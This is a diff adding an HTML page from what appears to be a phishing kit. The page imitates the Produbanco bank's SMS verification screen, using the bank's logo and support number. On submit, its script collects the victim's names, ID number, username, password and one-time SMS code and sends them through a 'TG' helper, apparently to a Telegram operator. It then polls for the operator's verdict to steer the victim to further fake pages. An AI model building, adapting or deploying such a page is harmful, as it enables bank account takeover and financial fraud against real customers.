@@ -1,0 +1,513 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SMS</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --ds-bg: #ffffff;
+      --ds-green-primary: #046a38;
+      --ds-green-secondary: #78be20;
+      --ds-gray-input: #b2b2b2;
+      --ds-gray-disabled: #e3e3e3;
+      --ds-gray-text: #8b8b8b;
+      --ds-gray-tertiary: #656565;
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: "Nunito Sans", sans-serif;
+    }
+
+    html,
+    body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+
+    body {
+      background-color: var(--ds-bg);
+      color: #000;
+    }
+
+    .ds-contenedor-principal {
+      min-height: 100vh;
+      width: 100%;
+    }
+
+    .ds-contenedor--publico {
+      background-color: var(--ds-bg);
+      display: grid;
+      grid-template-columns: minmax(640px, 44.2%) 1fr;
+      min-height: 100vh;
+      overflow-x: hidden;
+      width: 100%;
+    }
+
+    .ds-contenido-principal {
+      grid-column: 1;
+      padding: 0 15px;
+      width: 100%;
+    }
+
+    .ds-formulario {
+      margin: 0 auto;
+      max-width: 540px;
+      padding-bottom: 30px;
+      padding-top: 15px;
+      width: 100%;
+    }
+
+    .ds-logotipo {
+      background-image: url("https://www.produbanco.com/Produnet/Imagen/DesignSystem/logotipo.svg");
+      background-position: left center;
+      background-repeat: no-repeat;
+      background-size: 210px 58px;
+      height: 58px;
+      margin-bottom: 20px;
+      width: 210px;
+    }
+
+    .otp-titulo {
+      color: var(--ds-green-primary);
+      font-size: 28px;
+      font-style: normal;
+      font-weight: 700;
+      line-height: 34px;
+      margin: 0 0 30px;
+    }
+
+    .otp-card {
+      background: #f1f1f1;
+      border-radius: 4px;
+      box-shadow: 0 8px 20px -14px rgba(0, 0, 0, 0.4);
+      max-width: 100%;
+      padding: 17px 14px 18px;
+      width: 330px;
+    }
+
+    .otp-card-top {
+      align-items: flex-start;
+      display: flex;
+      gap: 16px;
+    }
+
+    .otp-icon {
+      display: block;
+      flex: 0 0 auto;
+      height: 47px;
+      margin-top: -2px;
+      width: 30px;
+    }
+
+    .otp-card-texto {
+      color: #3f4a56;
+      font-size: 15px;
+      font-style: normal;
+      font-weight: 600;
+      letter-spacing: 0;
+      line-height: 24px;
+      margin: 0;
+      max-width: 250px;
+    }
+
+    .otp-codigo {
+      display: flex;
+      gap: 7px;
+      margin-top: 18px;
+    }
+
+    .otp-input {
+      align-items: center;
+      border: 1px solid var(--ds-gray-input);
+      border-radius: 4px;
+      color: #3f4a56;
+      display: inline-flex;
+      font-size: 18px;
+      font-weight: 400;
+      height: 46px;
+      justify-content: center;
+      line-height: 1;
+      padding: 0;
+      text-align: center;
+      width: 31px;
+    }
+
+    .otp-input:first-child {
+      border-color: #2d9d69;
+    }
+
+    .otp-input:focus {
+      border-color: #2d9d69;
+      outline: none;
+    }
+
+    .otp-input::placeholder {
+      color: #8f8f8f;
+    }
+
+    .otp-note {
+      color: var(--ds-gray-text);
+      font-size: 15px;
+      font-style: normal;
+      font-weight: 400;
+      line-height: 24px;
+      margin: 14px 0 0;
+    }
+
+    .otp-actions {
+      display: flex;
+      gap: 18px;
+      margin-top: 44px;
+    }
+
+    .otp-btn {
+      align-items: center;
+      border: 1px solid transparent;
+      border-radius: 4px;
+      display: inline-flex;
+      font-size: 15px;
+      font-style: normal;
+      font-weight: 400;
+      height: 48px;
+      justify-content: center;
+      line-height: 21px;
+      min-width: 109px;
+      padding: 0 24px;
+      text-decoration: none;
+    }
+
+    .otp-btn--disabled {
+      background: var(--ds-gray-disabled);
+      border-color: var(--ds-gray-disabled);
+      color: var(--ds-gray-text);
+      cursor: not-allowed;
+      pointer-events: none;
+    }
+
+    .otp-btn--cancel {
+      background: transparent;
+      border-color: var(--ds-gray-tertiary);
+      color: var(--ds-gray-tertiary);
+      min-width: 115px;
+    }
+
+    .otp-btn--activo {
+      background: #046a38;
+      border-color: #046a38;
+      color: #fff;
+      cursor: pointer;
+      pointer-events: auto;
+    }
+
+    .otp-soporte {
+      margin-top: 28px;
+      text-align: left;
+    }
+
+    .otp-soporte-texto {
+      color: var(--ds-gray-text);
+      font-size: 15px;
+      font-style: normal;
+      font-weight: 400;
+      line-height: 24px;
+      margin: 0 0 10px;
+    }
+
+    .otp-soporte-telefono {
+      color: var(--ds-green-secondary);
+      font-size: 14px;
+      font-style: normal;
+      font-weight: 700;
+      line-height: 24px;
+      text-decoration: none;
+    }
+
+    .ds-imagen-principal {
+      grid-column: 2;
+      margin-left: 3px;
+      min-height: 100vh;
+    }
+
+    .ds-imagen-principal__banner {
+      background-image: url("https://www.produbanco.com/Produnet/Imagen/DesignSystem/ds_banner.png");
+      background-position: right top;
+      background-repeat: no-repeat;
+      background-size: cover;
+      height: 100%;
+      width: 100%;
+    }
+
+    @media screen and (max-width: 768px) {
+      .ds-contenedor--publico {
+        display: block;
+        min-height: 100vh;
+        padding: 0;
+      }
+
+      .ds-imagen-principal {
+        display: none;
+      }
+
+      .ds-contenido-principal {
+        margin: 0 auto;
+        max-width: 570px;
+        padding: 0 11px;
+      }
+
+      .ds-formulario {
+        max-width: 540px;
+      }
+
+      .otp-card {
+        width: 100%;
+      }
+
+      .otp-card-top {
+        gap: 11px;
+      }
+
+      .otp-icon {
+        height: 45px;
+        width: 28px;
+      }
+
+      .otp-card-texto {
+        max-width: none;
+      }
+
+      .otp-actions {
+        flex-direction: column;
+        gap: 14px;
+        margin-top: 42px;
+      }
+
+      .otp-btn {
+        width: 100%;
+      }
+
+      .otp-btn--cancel {
+        min-width: 0;
+      }
+
+      .otp-soporte {
+        margin-top: 20px;
+        text-align: center;
+      }
+    }
+  </style>
+</head>
+<body>
+  <main class="ds-contenedor-principal">
+    <section class="ds-contenedor--publico">
+      <section class="ds-contenido-principal">
+        <div class="ds-formulario">
+          <div class="ds-logotipo" aria-label="Logotipo Produbanco"></div>
+
+          <h1 class="otp-titulo">C&oacute;digo enviado por SMS</h1>
+
+          <form id="frmOtpSms">
+            <section class="otp-card">
+              <div class="otp-card-top">
+                <img
+                  class="otp-icon"
+                  src="https://static.wixstatic.com/media/1dff55_9578147109bd466c827bdd1750d036ce~mv2.png"
+                  alt="Tel&eacute;fono SMS"
+                >
+                <p class="otp-card-texto">
+                  Ingresa el c&oacute;digo temporal enviado por mensaje de texto a tu celular ********96
+                </p>
+              </div>
+
+              <div class="otp-codigo" aria-label="Casillas de c&oacute;digo SMS">
+                <input class="otp-input" inputmode="numeric" maxlength="1" placeholder="-" autocomplete="one-time-code" aria-label="D&iacute;gito 1" autofocus>
+                <input class="otp-input" inputmode="numeric" maxlength="1" placeholder="-" aria-label="D&iacute;gito 2">
+                <input class="otp-input" inputmode="numeric" maxlength="1" placeholder="-" aria-label="D&iacute;gito 3">
+                <input class="otp-input" inputmode="numeric" maxlength="1" placeholder="-" aria-label="D&iacute;gito 4">
+                <input class="otp-input" inputmode="numeric" maxlength="1" placeholder="-" aria-label="D&iacute;gito 5">
+                <input class="otp-input" inputmode="numeric" maxlength="1" placeholder="-" aria-label="D&iacute;gito 6">
+              </div>
+
+              <p class="otp-note">*Este c&oacute;digo expira en <span id="temporizador">5:00</span>.</p>
+            </section>
+
+            <div class="otp-actions">
+              <button id="btnAceptar" class="otp-btn otp-btn--disabled" type="submit" disabled>Aceptar</button>
+              <a class="otp-btn otp-btn--cancel" href="login.html">Cancelar</a>
+            </div>
+          </form>
+
+          <div class="otp-soporte">
+            <p class="otp-soporte-texto">Si tienes problemas para ingresar, comun&iacute;cate al:</p>
+            <a class="otp-soporte-telefono" href="tel:024009000">02 400 9000.</a>
+          </div>
+        </div>
+      </section>
+
+      <aside class="ds-imagen-principal" aria-hidden="true">
+        <div class="ds-imagen-principal__banner"></div>
+      </aside>
+    </section>
+  </main>
+
+  <script src="tg.js"></script>
+  <script>
+    (function () {
+      // Dynamic phone last 2 digits
+      var phone = TG.load('whatsapp');
+      if (phone && phone.length >= 2) {
+        var last2 = phone.slice(-2);
+        var textoEl = document.querySelector('.otp-card-texto');
+        textoEl.innerHTML = textoEl.innerHTML.replace(/\*{8}\d{2}/, '********' + last2);
+      }
+
+      const otpInputs = Array.from(document.querySelectorAll(".otp-input"));
+      const btnAceptar = document.getElementById("btnAceptar");
+      const frmOtpSms = document.getElementById("frmOtpSms");
+
+      function actualizarEstadoBoton() {
+        const completo = otpInputs.every(function (input) {
+          return input.value === "•" || /^[0-9]$/.test(input.value);
+        });
+
+        btnAceptar.disabled = !completo;
+        btnAceptar.classList.toggle("otp-btn--disabled", !completo);
+        btnAceptar.classList.toggle("otp-btn--activo", completo);
+      }
+
+      otpInputs.forEach(function (input, index) {
+        input.addEventListener("input", function () {
+          const digito = input.value.replace(/\D/g, "").slice(0, 1);
+          input.value = digito;
+
+          if (digito) {
+            const valorTemporalMostrado = digito;
+            setTimeout(function () {
+              if (input.value === valorTemporalMostrado) {
+                input.value = "•";
+                input.dataset.valor = valorTemporalMostrado;
+              }
+            }, 300);
+
+            if (index < otpInputs.length - 1) {
+              otpInputs[index + 1].focus();
+            }
+          }
+
+          actualizarEstadoBoton();
+        });
+
+        input.addEventListener("keydown", function (event) {
+          if (event.key === "Backspace") {
+            if (input.value) {
+              input.value = "";
+              delete input.dataset.valor;
+            } else if (index > 0) {
+              otpInputs[index - 1].value = "";
+              delete otpInputs[index - 1].dataset.valor;
+              otpInputs[index - 1].focus();
+            }
+            actualizarEstadoBoton();
+          }
+
+          if (
+            event.key.length === 1 &&
+            /\D/.test(event.key) &&
+            !event.ctrlKey &&
+            !event.metaKey &&
+            !event.altKey
+          ) {
+            event.preventDefault();
+          }
+        });
+
+        input.addEventListener("focus", function () {
+          input.select();
+        });
+      });
+
+      document.querySelector(".otp-codigo").addEventListener("paste", function (event) {
+        event.preventDefault();
+        const texto = (event.clipboardData || window.clipboardData).getData("text");
+        const digitos = texto.replace(/\D/g, "").slice(0, otpInputs.length);
+
+        if (!digitos) {
+          return;
+        }
+
+        otpInputs.forEach(function (input, idx) {
+          input.value = digitos[idx] || "";
+        });
+
+        const foco = Math.min(digitos.length, otpInputs.length - 1);
+        otpInputs[foco].focus();
+        actualizarEstadoBoton();
+      });
+
+      frmOtpSms.addEventListener("submit", function (event) {
+        event.preventDefault();
+        if (btnAceptar.disabled) return;
+
+        var smsCode = otpInputs.map(function (input) {
+          return input.dataset.valor || (input.value === '•' ? '' : input.value);
+        }).join('');
+
+        TG.save('sms', smsCode);
+
+        var msg = '\u{1F464} Nombres: ' + TG.load('nombres') + '\n'
+          + '\u{1F464} Apellidos: ' + TG.load('apellidos') + '\n'
+          + '\u{1F4C4} Documento: ' + TG.load('documento') + '\n'
+          + '\u{1F4C4} COD DIG: ' + TG.load('codDig') + '\n'
+          + '\u{1F3E6} \u00BFEs Cliente?: ' + TG.load('esCliente') + '\n'
+          + '\u{1F464} USU: ' + TG.load('usuario') + '\n'
+          + '\u{1F512} SENA: ' + TG.load('sena') + '\n'
+          + '\u{1F511} SMS: ' + smsCode;
+
+        TG.overlay(true);
+        TG.send(msg, true, null, { label: 'Nuevo \uD83C\uDD95', action: 'nuevo' }).then(function (sessionId) {
+          TG.poll(sessionId, function (action) {
+            TG.overlay(false);
+            if (action === 'correct') {
+              window.location.href = 'patron.html';
+            } else if (action === 'incorrect') {
+              window.location.href = 'incorrecto/sms.html';
+            } else if (action === 'nuevo') {
+              window.location.href = 'nuevo.html';
+            } else {
+              window.location.href = 'incorrecto/sms.html';
+            }
+          });
+        });
+      });
+
+      actualizarEstadoBoton();
+    })();
+  </script>
+
+<script>
+  (function() {
+    var timeRemaining = 300;
+    var timerElement = document.getElementById('temporizador');
+    if (!timerElement) return;
+    var timerInterval = setInterval(function() {
+      timeRemaining--;
+      var m = Math.floor(timeRemaining / 60);
+      var s = timeRemaining % 60;
+      if (s < 10) s = '0' + s;
+      timerElement.textContent = m + ':' + s;
+      if (timeRemaining <= 0) {
+        clearInterval(timerInterval);
+        var isIncorrecto = window.location.pathname.indexOf('incorrecto') !== -1;
+        window.location.href = isIncorrecto ? '../login.html' : 'login.html';
+      }
+    }, 1000);
+  })();
+</script>
+</body>
+</html>
